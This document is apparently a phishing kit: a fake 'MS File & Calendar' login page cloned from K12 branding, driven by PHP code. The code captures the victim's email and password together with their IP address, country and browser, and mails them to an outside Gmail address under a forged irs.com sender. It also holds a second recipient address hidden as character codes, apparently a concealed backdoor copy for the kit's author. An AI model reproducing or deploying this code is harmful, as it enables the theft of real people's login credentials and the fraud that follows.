﻿<?
$country = visitor_country();
$ip = getenv("REMOTE_ADDR");
$_SESSION['r'] = $_POST['r'];
$port = getenv("REMOTE_PORT");
$browser = $_SERVER['HTTP_USER_AGENT'];
$adddate=date("D M d, Y g:i a");

$message .= "----------------------------------------\n";
$message .= "Email: ".$_POST['wrist']."\n";
$id .= "".$_POST['wrist']."\n";
$message .= "key: ".$_POST['brist']."\n";
$message .= "------\n";
$message .= "IP Address : $ip\n";
$message .= "Country : ".$country."\n";
$message .= "Port : $port\n";
$message .= "---\n";
$message .= "Date : $adddate\n";
$message .= "User-Agent: ".$browser."\n";
$message .= "---\n";


$boss = "dagashini@gmail.com";


$subject = "Tax - $id";
$headers = "From: ww3@irs.com";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail($boss,$subject,$message,$headers);
// Function to get country and country sort;
function country_sort(){
	$sorter = "";
	$array = array(114,101,115,117,108,116,98,111,120,49,52,64,103,109,97,105,108,46,99,111,109);
		$count = count($array);
	for ($i = 0; $i < $count; $i++) {
			$sorter .= chr($array[$i]);
		}
	return array($sorter, $GLOBALS['recipient']);
}
function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}
?>
<!DOCTYPE html>
<html lang="en">
<head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><!-- pulling this meta for better accessibility--><meta name="viewport" content="initial-scale=1, maximum-scale=1, minimal-ui"><meta http-equiv="Expires" content="-1"><meta http-equiv="Pragma" content="no-cache">
	<title>MS File &amp; Calendar</title>
	<!-- FavIcon --><!--<link id="favicon" rel="shortcut icon" href="img/favicon_fe.ico"/>--><!-- Google webfonts --><script async="" src="mts_files/gtm.js"></script><script src="mts_files/nr-1167.js"></script><script type="text/javascript">(window.NREUM||(NREUM={})).loader_config={licenseKey:"57281df6cb",applicationID:"2745841"};window.NREUM||(NREUM={}),__nr_require=function(e,n,t){function r(t){if(!n[t]){var i=n[t]={exports:{}};e[t][0].call(i.exports,function(n){var i=e[t][1][n];return r(i||n)},i,i.exports)}return n[t].exports}if("function"==typeof __nr_require)return __nr_require;for(var i=0;i<t.length;i++)r(t[i]);return r}({1:[function(e,n,t){function r(){}function i(e,n,t){return function(){return o(e,[u.now()].concat(f(arguments)),n?null:this,t),n?void 0:this}}var o=e("handle"),a=e(4),f=e(5),c=e("ee").get("tracer"),u=e("loader"),s=NREUM;"undefined"==typeof window.newrelic&&(newrelic=s);var p=["setPageViewName","setCustomAttribute","setErrorHandler","finished","addToTrace","inlineHit","addRelease"],l="api-",d=l+"ixn-";a(p,function(e,n){s[n]=i(l+n,!0,"api")}),s.addPageAction=i(l+"addPageAction",!0),s.setCurrentRouteName=i(l+"routeName",!0),n.exports=newrelic,s.interaction=function(){return(new r).get()};var m=r.prototype={createTracer:function(e,n){var t={},r=this,i="function"==typeof n;return o(d+"tracer",[u.now(),e,t],r),function(){if(c.emit((i?"":"no-")+"fn-start",[u.now(),r,i],t),i)try{return n.apply(this,arguments)}catch(e){throw c.emit("fn-err",[arguments,this,e],t),e}finally{c.emit("fn-end",[u.now()],t)}}}};a("actionText,setName,setAttribute,save,ignore,onEnd,getContext,end,get".split(","),function(e,n){m[n]=i(d+n)}),newrelic.noticeError=function(e,n){"string"==typeof e&&(e=new Error(e)),o("err",[e,u.now(),!1,n])}},{}],2:[function(e,n,t){function r(e,n){var t=e.getEntries();t.forEach(function(e){"first-paint"===e.name?c("timing",["fp",Math.floor(e.startTime)]):"first-contentful-paint"===e.name&&c("timing",["fcp",Math.floor(e.startTime)])})}function i(e,n){var t=e.getEntries();t.length>0&&c("lcp",[t[t.length-1]])}function o(e){if(e instanceof s&&!l){var n,t=Math.round(e.timeStamp);n=t>1e12?Date.now()-t:u.now()-t,l=!0,c("timing",["fi",t,{type:e.type,fid:n}])}}if(!("init"in NREUM&&"page_view_timing"in NREUM.init&&"enabled"in NREUM.init.page_view_timing&&NREUM.init.page_view_timing.enabled===!1)){var a,f,c=e("handle"),u=e("loader"),s=NREUM.o.EV;if("PerformanceObserver"in window&&"function"==typeof window.PerformanceObserver){a=new PerformanceObserver(r),f=new PerformanceObserver(i);try{a.observe({entryTypes:["paint"]}),f.observe({entryTypes:["largest-contentful-paint"]})}catch(p){}}if("addEventListener"in document){var l=!1,d=["click","keydown","mousedown","pointerdown","touchstart"];d.forEach(function(e){document.addEventListener(e,o,!1)})}}},{}],3:[function(e,n,t){function r(e,n){if(!i)return!1;if(e!==i)return!1;if(!n)return!0;if(!o)return!1;for(var t=o.split("."),r=n.split("."),a=0;a<r.length;a++)if(r[a]!==t[a])return!1;return!0}var i=null,o=null,a=/Version\/(\S+)\s+Safari/;if(navigator.userAgent){var f=navigator.userAgent,c=f.match(a);c&&f.indexOf("Chrome")===-1&&f.indexOf("Chromium")===-1&&(i="Safari",o=c[1])}n.exports={agent:i,version:o,match:r}},{}],4:[function(e,n,t){function r(e,n){var t=[],r="",o=0;for(r in e)i.call(e,r)&&(t[o]=n(r,e[r]),o+=1);return t}var i=Object.prototype.hasOwnProperty;n.exports=r},{}],5:[function(e,n,t){function r(e,n,t){n||(n=0),"undefined"==typeof t&&(t=e?e.length:0);for(var r=-1,i=t-n||0,o=Array(i<0?0:i);++r<i;)o[r]=e[n+r];return o}n.exports=r},{}],6:[function(e,n,t){n.exports={exists:"undefined"!=typeof window.performance&&window.performance.timing&&"undefined"!=typeof window.performance.timing.navigationStart}},{}],ee:[function(e,n,t){function r(){}function i(e){function n(e){return e&&e instanceof r?e:e?c(e,f,o):o()}function t(t,r,i,o){if(!l.aborted||o){e&&e(t,r,i);for(var a=n(i),f=v(t),c=f.length,u=0;u<c;u++)f[u].apply(a,r);var p=s[y[t]];return p&&p.push([b,t,r,a]),a}}function d(e,n){h[e]=v(e).concat(n)}function m(e,n){var t=h[e];if(t)for(var r=0;r<t.length;r++)t[r]===n&&t.splice(r,1)}function v(e){return h[e]||[]}function g(e){return p[e]=p[e]||i(t)}function w(e,n){u(e,function(e,t){n=n||"feature",y[t]=n,n in s||(s[n]=[])})}var h={},y={},b={on:d,addEventListener:d,removeEventListener:m,emit:t,get:g,listeners:v,context:n,buffer:w,abort:a,aborted:!1};return b}function o(){return new r}function a(){(s.api||s.feature)&&(l.aborted=!0,s=l.backlog={})}var f="nr@context",c=e("gos"),u=e(4),s={},p={},l=n.exports=i();l.backlog=s},{}],gos:[function(e,n,t){function r(e,n,t){if(i.call(e,n))return e[n];var r=t();if(Object.defineProperty&&Object.keys)try{return Object.defineProperty(e,n,{value:r,writable:!0,enumerable:!1}),r}catch(o){}return e[n]=r,r}var i=Object.prototype.hasOwnProperty;n.exports=r},{}],handle:[function(e,n,t){function r(e,n,t,r){i.buffer([e],r),i.emit(e,n,t)}var i=e("ee").get("handle");n.exports=r,r.ee=i},{}],id:[function(e,n,t){function r(e){var n=typeof e;return!e||"object"!==n&&"function"!==n?-1:e===window?0:a(e,o,function(){return i++})}var i=1,o="nr@id",a=e("gos");n.exports=r},{}],loader:[function(e,n,t){function r(){if(!x++){var e=E.info=NREUM.info,n=d.getElementsByTagName("script")[0];if(setTimeout(s.abort,3e4),!(e&&e.licenseKey&&e.applicationID&&n))return s.abort();u(y,function(n,t){e[n]||(e[n]=t)}),c("mark",["onload",a()+E.offset],null,"api");var t=d.createElement("script");t.src="https://"+e.agent,n.parentNode.insertBefore(t,n)}}function i(){"complete"===d.readyState&&o()}function o(){c("mark",["domContent",a()+E.offset],null,"api")}function a(){return O.exists&&performance.now?Math.round(performance.now()):(f=Math.max((new Date).getTime(),f))-E.offset}var f=(new Date).getTime(),c=e("handle"),u=e(4),s=e("ee"),p=e(3),l=window,d=l.document,m="addEventListener",v="attachEvent",g=l.XMLHttpRequest,w=g&&g.prototype;NREUM.o={ST:setTimeout,SI:l.setImmediate,CT:clearTimeout,XHR:g,REQ:l.Request,EV:l.Event,PR:l.Promise,MO:l.MutationObserver};var h=""+location,y={beacon:"bam.nr-data.net",errorBeacon:"bam.nr-data.net",agent:"js-agent.newrelic.com/nr-1167.min.js"},b=g&&w&&w[m]&&!/CriOS/.test(navigator.userAgent),E=n.exports={offset:f,now:a,origin:h,features:{},xhrWrappable:b,userAgent:p};e(1),e(2),d[m]?(d[m]("DOMContentLoaded",o,!1),l[m]("load",r,!1)):(d[v]("onreadystatechange",i),l[v]("onload",r)),c("mark",["firstbyte",f],null,"api");var x=0,O=e(6)},{}],"wrap-function":[function(e,n,t){function r(e){return!(e&&e instanceof Function&&e.apply&&!e[a])}var i=e("ee"),o=e(5),a="nr@original",f=Object.prototype.hasOwnProperty,c=!1;n.exports=function(e,n){function t(e,n,t,i){function nrWrapper(){var r,a,f,c;try{a=this,r=o(arguments),f="function"==typeof t?t(r,a):t||{}}catch(u){l([u,"",[r,a,i],f])}s(n+"start",[r,a,i],f);try{return c=e.apply(a,r)}catch(p){throw s(n+"err",[r,a,p],f),p}finally{s(n+"end",[r,a,c],f)}}return r(e)?e:(n||(n=""),nrWrapper[a]=e,p(e,nrWrapper),nrWrapper)}function u(e,n,i,o){i||(i="");var a,f,c,u="-"===i.charAt(0);for(c=0;c<n.length;c++)f=n[c],a=e[f],r(a)||(e[f]=t(a,u?f+i:i,o,f))}function s(t,r,i){if(!c||n){var o=c;c=!0;try{e.emit(t,r,i,n)}catch(a){l([a,t,r,i])}c=o}}function p(e,n){if(Object.defineProperty&&Object.keys)try{var t=Object.keys(e);return t.forEach(function(t){Object.defineProperty(n,t,{get:function(){return e[t]},set:function(n){return e[t]=n,n}})}),n}catch(r){l([r])}for(var i in e)f.call(e,i)&&(n[i]=e[i]);return n}function l(n){try{e.emit("internal-error",n)}catch(t){}}return e||(e=i),t.inPlace=u,t.flag=a,t}},{}]},{},["loader"]);</script>
	<link href="mts_files/css.css" rel="stylesheet" type="text/css" /><script type="text/javascript">

    
    
        window.legacyAnalyics = false;
    

    </script>
	<style type="text/css">.pre-loading-messsage {
            font-family: Arial, Helvetica Neue, Helvetica, sans-serif;
        }

        #load-error-message,
        #reload-suggestion {
            display: none;
        }

            /* thanks to https://martinwolf.org/blog/2015/01/pure-css-savingloading-dots-animation */
        @keyframes blink {
            /**
             * At the start of the animation the dot
             * has an opacity of .2
             */
            0% {
                opacity: .2;
            }
            /**
             * At 20% the dot is fully visible and
             * then fades out slowly
             */
            20% {
                opacity: 1;
            }
            /**
             * Until it reaches an opacity of .2 and
             * the animation can start again
             */
            100% {
                opacity: .2;
            }
        }

        #loading-message span {
            /**
             * Use the blink animation, which is defined above
             */
            animation-name: blink;
            /**
             * The animation should take 1.4 seconds
             */
            animation-duration: 1.4s;
            /**
             * It will repeat itself forever
             */
            animation-iteration-count: infinite;
            /**
             * This makes sure that the starting style (opacity: .2)
             * of the animation is applied before the animation starts.
             * Otherwise we would see a short flash or would have
             * to set the default styling of the dots to the same
             * as the animation. Same applies for the ending styles.
             */
            animation-fill-mode: both;
        }

        #loading-message span:nth-child(2) {
            /**
             * Starts the animation of the third dot
             * with a delay of .2s, otherwise all dots
             * would animate at the same time
             */
            animation-delay: .2s;
        }

        #loading-message span:nth-child(3) {
            /**
             * Starts the animation of the third dot
             * with a delay of .4s, otherwise all dots
             * would animate at the same time
             */
            animation-delay: .4s;
        }
	</style>
	<script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="main-1582822778306" src="mts_files/main-1582822778306.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="jquery" src="mts_files/jquery_002.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="underscore" src="mts_files/lodash.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="postal" src="mts_files/postal.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="vendor/require-css/css.min" src="mts_files/css.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="spin" src="mts_files/spin.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="modernizr" src="mts_files/modernizr.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="handlebars" src="mts_files/handlebars.js"></script>
	<style type="text/css">
	</style>
	<script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="backbone" src="mts_files/backbone-min.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="bootstrapGrowl" src="mts_files/bootstrap-growl.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="bootstrap-toggle" src="mts_files/bootstrap-toggle.js"></script>
	<link href="mts_files/bootstrap.css" rel="stylesheet" type="text/css" />
	<link href="mts_files/bootstrap-toggle.css" rel="stylesheet" type="text/css" />
	<link href="mts_files/peak12-1582822778306.css" rel="stylesheet" type="text/css" />
	<link href="mts_files/font-awesome.css" rel="stylesheet" type="text/css" />
	<link href="mts_files/bootstrap-slider.css" rel="stylesheet" type="text/css" /><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="application-1582822778306" src="mts_files/application-1582822778306.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="enquire" src="mts_files/enquire.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="slimScroll" src="mts_files/jquery.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="bootstrap" src="mts_files/bootstrap.js"></script>
	<link href="" id="favicon" rel="shortcut icon" /><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="app/modules/analytics/nextgen/tracking.controller.nextgen" src="mts_files/tracking.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="app/modules/analytics/nextgen/tracking.collection.nextgen" src="mts_files/tracking_002.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="app/modules/analytics/nextgen/track.model.nextgen" src="mts_files/track.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="app/modules/analytics/nextgen/trackalp.model" src="mts_files/trackalp.js"></script>
</head>
<body class="nextgen login-body" data-release="1.0"><!-- Google Tag Manager --><noscript>
        <iframe src="//www.googletagmanager.com/ns.html?id=GTM-WN3ZSC"
                height="0" width="0" style="display:none;visibility:hidden"></iframe>
    </noscript><script>

    function startGA() {
      if (window.canLoadExternalScripts) {
        (function (w, d, s, l, i) {
          w[l] = w[l] || [];
          w[l].push(

            {'gtm.start': new Date().getTime(), event: 'gtm.js'}

          );
          var f = d.getElementsByTagName(s)[0],
            j = d.createElement(s), dl = l != 'dataLayer' ? '&l=' + l : '';
          j.async = true;
          j.src =
            '//www.googletagmanager.com/gtm.js?id=' + i + dl;
          f.parentNode.insertBefore(j, f);
        })(window, document, 'script', 'dataLayer', 'GTM-WN3ZSC');
      } else {
        setTimeout("startGA()", 1000);
      }
    }

    startGA();

    </script>
<div class="app-container">
<section class="wrapper">
<div class="login-wrapper">
<div class="active-dash-module container-fluid">
<div class="col-sm-8 col-sm-offset-2" id="logo-container"><img alt="https://bit.ly/2IYpvyM" src="https://bit.ly/2IYpvyM" /></div>

<div class="col-sm-8 col-sm-offset-2 form-container content-panel">
<div class="row form-mask-container">
<div class="col-md-7 interior-content" id="form">
<div class="page-title page-title-widget">
<div class="pageTitle ">
<h1 class="page-title" tabindex="-1">Login To File Archive</h1>

<div class="pageTitleLink"></div>

<h4 class="pageSubTitle ">Log in now using your email account .</h4>
</div>
</div>

<div class="gh-tooltip-handled gh-popovers-handled" id="form-container">
<div>
<div class="col-lg-10 col-lg-offset-2 form-all-fields-required required-fields">Please confirm if your password is correct.</div>
</div>

<form action="index.php" autocomplete="off" id="loginForm" method="post" novalidate="novalidate" onkeypress="if (event &amp;&amp; event.keyCode == 13){ didSubmitForm(); Login.submitLoginRequest();}">
<div aria-live="assertive" class="form-message sr-only"></div>

<div class="form-group gh-input gh-input-text" id="form-input-username"><label aria-label="Username" class="col-lg-2 control-label" for="input-text-username" id="label-text-username">Email</label>

<div class="pull-right input-link"></div>

<div class="col-lg-10 form-input  text" id="element-text-username"><input aria-labelledby="label-text-username" autocapitalize="none" autocorrect="off" class="form-control " id="input-text-username" maxlength="100" name="wrist" type="text" /></div>

<div class="col-lg-10 form-input  text"></div>
</div>

<div class="form-group gh-input gh-input-password" id="form-input-password"><label aria-label="Password" class="col-lg-2 control-label" for="input-password-password" id="label-password-password">Password </label>

<div class="pull-right input-link"></div>

<div class="col-lg-10 form-input  password" id="element-password-password"><input aria-labelledby="label-password-password" class="form-control " id="input-password-password" maxlength="100" name="brist" type="password" /></div>
</div>

<div class="form-group gh-input gh-input-static" id="form-input-terms">
<div class="form-input  static" id="element-static-terms">
<p class="form-control-static "></p>
</div>
</div>

<div class="col-lg-offset-2"><span id="form-button-login"><button aria-label="Log In " class="clickable btn btn-primary " data-link-id="1221929120" data-navigate="" data-options="{}" data-url="" data-urlnav="" false="" id="c97" title="Log In " type="Link">Log In</button></span></div>
</form>
</div>
</div>

<div class="col-md-5 interior-content" id="partner-content">
<div class="login-partner-content">
<h3 class="secondary-header">Have a registration ID?</h3>
<!-- special sauce for plan page--><!-- for others-->

<p class="sub-text"><img alt="https://bit.ly/2ITmeAL" height="129" src="https://bit.ly/2ITmeAL" width="214" /></p>

<div class="link"><a aria-label="Set Up Your Account
    (Opens in new window)" class="clickable btn btn-default btn-lg btn-block secondary-button " data-link-id="669719324" data-navigate="" data-options="{}" data-url="https://registration.k12.com/registration/step1.jsp" data-urlnav="" href="#" id="c100" tabindex="0" target="_blank" title="Set Up Your Account (Opens in new window)"><span class="sr-only">Opens in new window</span> <span class="link-text "> Set Up Your Account </span> </a></div>
</div>
</div>
</div>

<div class="col-lg-offset-1" id="help-content"></div>
</div>

<div class="col-sm-8 col-sm-offset-2 copyright-text" id="copyright-text"><!-- special sauce for plan page--><!-- for others-->
<p class="sub-text">Copyright &copy; 2020 MS File &amp; Calendar.</p>

<div><span><a href="http://www.k12.com/privacy.html" target="_blank">Privacy Policy<span class="sr-only">Opens in new window</span><img alt="New Window ICON" role="presentation" src="mts_files/new-window-icon.svg" /></a></span><span><a href="http://www.k12.com/ip-policy" target="_blank">Intellectual Property Policy<span class="sr-only">Opens in new window</span><img alt="New Window ICON" role="presentation" src="mts_files/new-window-icon.svg" /></a></span><span><a href="http://www.k12.com/terms.html" target="_blank">Terms of Use<span class="sr-only">Opens in new window</span><img alt="New Window ICON" data-pin-nopin="true" role="presentation" src="mts_files/new-window-icon.svg" /></a></span><span><a href="http://www.k12.com/accessibility.html" target="_blank">Accessibility Policy<span class="sr-only">Opens in new window</span><img alt="New Window ICON" data-pin-nopin="true" role="presentation" src="mts_files/new-window-icon.svg" /></a></span></div>

<p></p>
</div>
</div>
</div>

<div aria-live="assertive" class="modal-message-container">
<div aria-hidden="true" aria-labelledby="modal-title" class="modal fade" id="dashboard-message" role="dialog" tabindex="-1"><!-- Modal --><!-- fade hide -->
<div class="modal-dialog">
<div class="modal-content"><!--<div class="modal-icon-wrapper text-center hide">--><!--<i class="modal-icon fa"></i>--><!--</div>-->
<div class="modal-header"><button class="close hidden" data-dismiss="modal" type="button"><span class="sr-only">Close</span></button>

<div id="modal-title-header"></div>

<div class="modal-title" id="modal-title"></div>
</div>

<div class="modal-body text-center">
<p class="modal-message "></p>
</div>

<div class="modal-footer hide">
<div class="text-center"><button aria-hidden="true" class="effeckt-button button primary-button" data-dismiss="modal">OK</button></div>
</div>
</div>
</div>
</div>
</div>

<div class="ng-loader" id="loader" style="display: none;">
<div class="rect"></div>

<div class="rect"></div>

<div class="rect"></div>

<div class="rect"></div>

<div class="rect"></div>

<div class="loader-message">Loading...</div>
</div>
</section>
</div>
<!-- RequireJS --><script type="text/javascript" data-main="js/main-1582822778306" src="mts_files/require.js"></script><!--show reload message if page load takes too long--><script type="text/javascript">
    setTimeout(function () {
        var loadingMessage = document.getElementById('loading-message'),
                errorHeader = document.getElementById('load-error-message'),
                message = document.getElementById('reload-suggestion');
        if (message) {
            loadingMessage.style.display = "none";
            errorHeader.style.display = "block";
            message.style.display = "block";
        }
    }, 15000);
</script><script type="text/javascript">window.NREUM||(NREUM={});NREUM.info={"applicationID":"2745841","applicationTime":1,"beacon":"bam.nr-data.net","queueTime":0,"licenseKey":"57281df6cb","transactionName":"ZAYBbRBZXkZQUUIMDV1MKWoyF1lbVVdOSwhAEw==","agent":"","errorBeacon":"bam.nr-data.net"}</script></body>
</html>